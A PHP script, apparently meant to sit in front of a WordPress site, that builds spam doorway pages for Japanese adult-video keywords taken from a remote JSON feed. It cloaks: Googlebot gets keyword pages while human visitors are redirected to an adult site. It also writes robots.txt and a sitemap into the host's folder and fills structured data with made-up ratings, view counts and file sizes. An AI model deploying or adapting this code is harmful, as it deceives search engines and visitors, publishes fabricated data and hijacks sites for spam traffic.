<?php
// --- [PERBAIKAN ROUTING] ---
$base_path = str_replace('\\', '/', dirname($_SERVER['SCRIPT_NAME']));
$base_path = ($base_path == '/' || $base_path == '.') ? '' : $base_path;
$request_uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
$request_path = $base_path ? substr($request_uri, strlen($base_path)) : $request_uri;
$request_path = trim($request_path, '/');
// --- AKHIR PERBAIKAN ROUTING ---


// [REQUEST 1] URL JSON BARU
$content_url = 'https://player.javpornsub.net/content/testdulujson.json';

// --- $video_pool Dihapus ---

// Fungsi fetchFromUrl (Tanpa Cache, Sesuai permintaan Anda)
function fetchFromUrl($url, $default = []) {
    $content = false;
    if (ini_get('allow_url_fopen')) {
        $content = @file_get_contents($url);
    }
    if ($content === false && function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $content = curl_exec($ch);
        curl_close($ch);
    }
    $data = json_decode($content, true);
    if (is_array($data) && !empty($data)) {
        return $data;
    }
    return $default;
}

// Fungsi Spintax
function spin(string $text): string {
    $pattern = '/\{([^{}]*?)\}/';
    while (preg_match($pattern, $text, $matches)) {
        $choices = explode('|', $matches[1]);
        $text = substr_replace(
            $text,
            $choices[array_rand($choices)],
            strpos($text, $matches[0]),
            strlen($matches[0])
        );
    }
    return $text;
}
// --- AKHIR FUNGSI ---

// --- [PERMINTAAN 2] BLOK GENERATOR ROBOTS.TXT ---
if ($request_path === 'robots' || $request_path === 'robots.txt') {
    $robots_file = 'robots.txt';
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
    $domain = $_SERVER['HTTP_HOST'];
    $base_url = $protocol . $domain . $base_path; 
    
    // [PERMINTAAN 3] Menggunakan nama sitemap.xml
    $sitemap_url = $base_url . '/sitemap.xml';
    
    $robots_content = "User-agent: *\nAllow: /\n\nSitemap: " . $sitemap_url;
    
    file_put_contents(dirname($_SERVER['SCRIPT_FILENAME']) . '/' . $robots_file, $robots_content);
    
    header('Content-Type: text/plain');
    echo "robots.txt generated successfully.\n";
    echo $robots_content;
    exit;
}
// --- AKHIR BLOK ROBOTS.TXT ---


// [REQUEST 2] BLOK GENERATOR SITEMAP
if ($request_path === 'sitemap' || $request_path === 'sitemap.xml') {
    // [PERMINTAAN 3] Nama file diubah ke sitemap.xml
    $sitemap_file = 'sitemap.xml'; 

    $content_data = fetchFromUrl($content_url, []);
    $keywords = $content_data ? array_keys($content_data) : ['homepage-default'];

    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
    $domain = $_SERVER['HTTP_HOST'];
    $base_url = $protocol . $domain . $base_path; 

    date_default_timezone_set('Asia/Jakarta');
    $now = date('Y-m-d\TH:i:s+07:00'); 

    $xml = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
    $xml .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
    
    foreach ($keywords as $keyword) {
        $url = $base_url . '/' . htmlspecialchars(urlencode($keyword));
        $xml .= '  <url>' . PHP_EOL;
        $xml .= '    <loc>' . $url . '</loc>' . PHP_EOL;
        $xml .= '    <lastmod>' . $now . '</lastmod>' . PHP_EOL;
        $xml .= '  </url>' . PHP_EOL;
    }

    $xml .= '</urlset>' . PHP_EOL;

    file_put_contents(dirname($_SERVER['SCRIPT_FILENAME']) . '/' . $sitemap_file, $xml);
    header('Content-Type: text/plain');
    echo "Sitemap generated successfully at $sitemap_file\n";
    echo "Total URLs: " . (count($keywords)) . "\n";
    echo "Generated at: $now (WIB, Asia/Jakarta)\n";
    exit; 
}
// --- AKHIR BLOK SITEMAP ---


// --- [PERMINTAAN 1] FITUR PREVIEW BARU ---
$is_preview_mode = isset($_GET['p']); // Cek apakah ?p ada
// --- AKHIR PERMINTAAN 1 ---

// --- TENTUKAN USER AGENT (Dipindahkan ke atas) ---
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$is_googlebot = preg_match('/google/i', $user_agent);


// MENGAMBIL SLUG DARI URL
$input = $request_path; 

$content_data = fetchFromUrl($content_url, [
    'default-keyword' => 'Default description if JSON fails'
]);
$all_keywords = array_keys($content_data);

// Tentukan Tipe Halaman
$found = ($input !== '' && array_key_exists($input, $content_data));
$is_homepage = ($input === '');

// --- [PERBAIKAN] LOGIKA REDIRECT ---
if (!$is_googlebot && !$is_preview_mode && $found) {
    header('Location: https://javpornsub.net'); 
    exit;
}

// --- [PERBAIKAN KRITIS UNTUK WORDPRESS] ---
if ($is_homepage) {
    return; 
}

if (!$found) {
    // Biarkan WordPress menangani 404
    return; 
}
// --- HANYA HALAMAN SLUG YANG VALID YANG LOLOS ---


$title_slug = htmlspecialchars(str_replace('-', ' ', $input));
$additional_content = htmlspecialchars($content_data[$input]);

// PERBAIKAN URL KANONIKAL
$canonical = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$canonical_url_only = 'https://' . $_SERVER['HTTP_HOST'] . rtrim(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH), '/');

// --- [PERBAIKAN] DATA UNIK OTOMATIS (TANPA POOL) ---
$thumbnail = 'https://placehold.co/1280x720/1a1a1a/e0e0e0/?text=' . urlencode(ucwords($title_slug)) . '&font=lato';
$download_link = $canonical_url_only . '?download=1&file=' . $input;
$file_size = spin('{850 MB|1.2 GB|1.5 GB|920 MB|1.1 GB}');
$file_quality = spin('{1080p HD|720p HD|Full HD 1080p}');
// --- AKHIR DATA UNIK ---


// Variabel dinamis untuk template
$upload_date = date('Y-m-d', time() - rand(86400, 86400 * 30)); 
$video_id_prefix = 'JAV-' . rand(1000, 9999);
$actress_name = 'Subbed-' . rand(100, 999);
$rating_value = number_format(rand(48, 50) / 10, 1); 
$rating_count = rand(2500, 15000); 

// --- AMP Dihapus ---

// --- [PENYESUAIAN SEO] ---
// Judul SEO sekarang menggunakan Spintax untuk kata kunci target Anda
$seo_title = ucwords($title_slug) . ' | ' . spin('{JAV Subtitle English|JAV Sub Eng|JAV Subbed}');
$seo_description = $additional_content;

?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
    <title><?php echo $seo_title; ?></title>
    <meta name="description" content="<?php echo $seo_description; ?>" />
    <link rel="canonical" href="<?php echo $canonical_url_only; ?>" />
    
    <link rel="icon" type="image/png" href="https://sextb.net/images/icons/ms-icon-144x144.png">

    <meta property="og:title" content="<?php echo $seo_title; ?>" />
    <meta property="og:description" content="<?php echo $seo_description; ?>" />
    <meta property="og:url" content="<?php echo $canonical_url_only; ?>" />
    <meta property="og:site_name" content="JAV Subtitle English" />
    <meta property="og:type" content="video.movie" />
    <meta property="og:image" content="<?php echo $thumbnail; ?>" />
    <meta property="og:image:width" content="1280" />
    <meta property="og:image:height" content="720" />

    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="<?php echo $seo_title; ?>" />
    <meta name="twitter:description" content="<?php echo $seo_description; ?>" />
    <meta name="twitter:image" content="<?php echo $thumbnail; ?>" />

    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; line-height: 1.6; background-color: #121212; color: #e0e0e0; margin: 0; padding: 0; }
        .container { max-width: 1000px; margin: 0 auto; padding: 0 15px; }
        header { background-color: #1f1f1f; padding: 12px 0; border-bottom: 2px solid #e50914; }
        header .container { display: flex; justify-content: space-between; align-items: center; }
        .logo { font-size: 1.6rem; font-weight: bold; color: #ffffff; text-decoration: none; text-transform: uppercase; letter-spacing: 1px; }
        .logo span { color: #e50914; }
        .nav a { color: #b0b0b0; text-decoration: none; margin-left: 20px; font-weight: 500; }
        .nav a:hover { color: #fff; }
        
        .fake-player { 
            position: relative; 
            display: block; 
            width: 100%; 
            aspect-ratio: 16 / 9; 
            background-color: #000; 
            border: 1px solid #333; 
            margin-top: 20px; 
            cursor: pointer; 
            overflow: hidden; 
        }
        .fake-player img { 
            width: 100%; 
            height: 100%; 
            object-fit: cover; 
            display: block; 
        }
        .fake-player .play-button { 
            position: absolute; 
            top: 50%; 
            left: 50%; 
            transform: translate(-50%, -50%); 
            font-size: 80px; 
            color: rgba(255, 255, 255, 0.8); 
            transition: transform 0.2s; 
            pointer-events: none; 
            z-index: 2; 
        }
        .fake-player:hover .play-button { transform: translate(-50%, -50%) scale(1.1); }
        
        main { width: 100%; }
        article { background-color: #1e1e1e; padding: 25px; border-radius: 5px; width: 100%; box-sizing: border-box; margin-top: 20px;}
        h1 { font-size: 2.2rem; font-weight: 700; color: #ffffff; margin-top: 0; margin-bottom: 20px; }
        h2 { font-size: 1.5rem; font-weight: 600; color: #ffffff; margin-top: 25px; margin-bottom: 15px; border-bottom: 1px solid #444; padding-bottom: 5px; }
        article p { font-size: 1rem; color: #b0b0b0; margin-bottom: 15px; }
        
        .file-meta { list-style: none; padding: 0; margin: 20px 0; border-top: 1px solid #444; border-bottom: 1px solid #444; padding: 15px 0; }
        .file-meta li { margin-bottom: 10px; color: #b0b0b0; font-size: 1.1rem; }
        .file-meta li strong { color: #fff; min-width: 120px; display: inline-block; }
        
        .btn-ctas { margin: 25px 0; }
        .btn { display: inline-block; background-color: #e50914; color: #ffffff; padding: 15px 25px; text-decoration: none; border-radius: 5px; font-weight: bold; font-size: 1.3rem; border: none; cursor: pointer; text-align: center; }
        .btn:hover { background-color: #f40612; }
        
        .rating-stars { color: #f5c518; }
        
        .related-links ul { list-style: none; padding: 0; column-count: 2; }
        .related-links li { margin-bottom: 10px; }
        .related-links a { color: #e50914; text-decoration: none; font-weight: 500; }
        .related-links a:hover { text-decoration: underline; color: #fff; }
        footer { text-align: center; margin-top: 30px; padding: 25px 0; border-top: 1px solid #333; font-size: 0.9rem; color: #777; }
        @media (max-width: 768px) { h1 { font-size: 1.8rem; } .related-links ul { column-count: 1; } }
    </style>

    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "VideoObject",
      "name": "<?php echo $seo_title; ?>",
      "description": "<?php echo $seo_description; ?>",
      "thumbnailUrl": "<?php echo $thumbnail; ?>",
      "uploadDate": "<?php echo $upload_date; ?>",
      "duration": "PT<?php echo rand(25, 55); ?>M<?php echo rand(10, 59); ?>S", 
      "contentUrl": "<?php echo $canonical_url_only; ?>",
      "publisher": {
        "@type": "Organization",
        "name": "JAV Subtitle English",
        "logo": {
          "@type": "ImageObject",
          "url": "https://sextb.net/images/icons/ms-icon-144x144.png"
        }
      },
      "interactionStatistic": {
        "@type": "InteractionCounter",
        "interactionType": { "@type": "WatchAction" },
        "userInteractionCount": "<?php echo rand(5000, 50000); ?>"
      },
      "aggregateRating": {
        "@type": "AggregateRating",
        "ratingValue": "<?php echo $rating_value; ?>",
        "bestRating": "5",
        "ratingCount": "<?php echo $rating_count; ?>"
      }
    }
    </script>
</head>
<body>
    <header>
        <div class="container">
            <a href="/" class="logo">JAV<span>SUB</span></a>
            <nav class="nav">
                <a href="/">Home</a>
                <a href="/sitemap">Sitemap</a>
            </nav>
        </div>
    </header>

    <div class="container">
        <main>
            <h1>Watch or Download: <?php echo ucwords($title_slug); ?></h1>
            
            <a href="<?php echo $download_link; ?>" class="fake-player" title="Stream or Download <?php echo ucwords($title_slug); ?>">
                <img src="<?php echo $thumbnail; ?>" alt="Play <?php echo ucwords($title_slug); ?>">
                <div class="play-button">&#9658;</div>
            </a>

            <article>
                <div class="btn-ctas">
                    <a href="<?php echo $download_link; ?>" class="btn">Download Full Video (<?php echo $file_size; ?>)</a>
                </div>

                <h2>File Information: <?php echo ucwords($title_slug); ?></h2>
                
                <ul class="file-meta">
                    <li><strong>File Name:</strong> <?php echo htmlspecialchars($input); ?>.mp4</li>
                    <li><strong>Quality:</strong> <?php echo $file_quality; ?></li>
                    <li><strong>Subtitles:</strong> English (Hardsubbed)</li>
                    <li class="rating-stars">
                        <strong>Rating:</strong>
                        <span>&#9733; &#9733; &#9733; &#9733; &#9734;</span> 
                        (<?php echo $rating_value; ?>/5 based on <?php echo number_format($rating_count); ?> votes)
                    </li>
                </ul>

                <h2>Synopsis:</h2>
                <p><strong><?php echo $additional_content; ?></strong></p>
                
                <p><?php echo spin(
                    "This {file|video} is part of our {exclusive|massive|premium} collection of <strong>JAV Sub English</strong> content. We {specialize|focus} in providing {high-quality|top-tier}, accurately translated <strong>JAV subbed</strong> videos for free streaming and download. Our {platform|site} is the {#1|best|top} source for {finding|discovering} {new|fresh} releases with English subtitles."
                ); ?></p>
                <p><?php echo spin(
                    "{Stream or download|Get} your <?php echo ucwords($title_slug); ?> video and {hundreds|thousands} more, {updated daily|refreshed daily}. Our platform is {dedicated|built} for fans of Date: <strong>JAV Sub Eng</strong> content, ensuring a {fast|reliable|easy} experience in {HD|1080p|Full HD}."
                ); ?></p>
            </article>

            <nav class="related-links">
                <h2><?php echo spin('{More Content|Related Files|Discover More}'); ?></h2>
                <ul>
                    <?php
                    $link_count = 4;
                    if (count($all_keywords) > $link_count) {
                        $random_keys = array_rand($all_keywords, $link_count);
                        foreach ($random_keys as $key) {
                            $slug = htmlspecialchars($all_keywords[$key]);
                            if ($slug != $input) {
                                $link_title = ucwords(str_replace('-', ' ', $slug));
                                echo "<li><a href='/{$slug}'>{$link_title}</a></li>";
                            }
                        }
                    }
                    ?>
                    <li><a href="/">Home (Main)</a></li>
                    <li><a href="/sitemap">Sitemap</a></li>
                </ul>
            </nav>

        </main>
        
        <footer>
            <p>&copy; <?php echo date('Y'); ?> JAV Subtitle English. All rights reserved.</p>
            <p>Disclaimer: All video files on this site are hosted by third-party providers. We do not upload any content.</p>
        </footer>
    </div>
</body>
</html>
<?php 
// PENTING: Gunakan exit; di sini untuk memastikan WordPress tidak berjalan
exit; 
?>
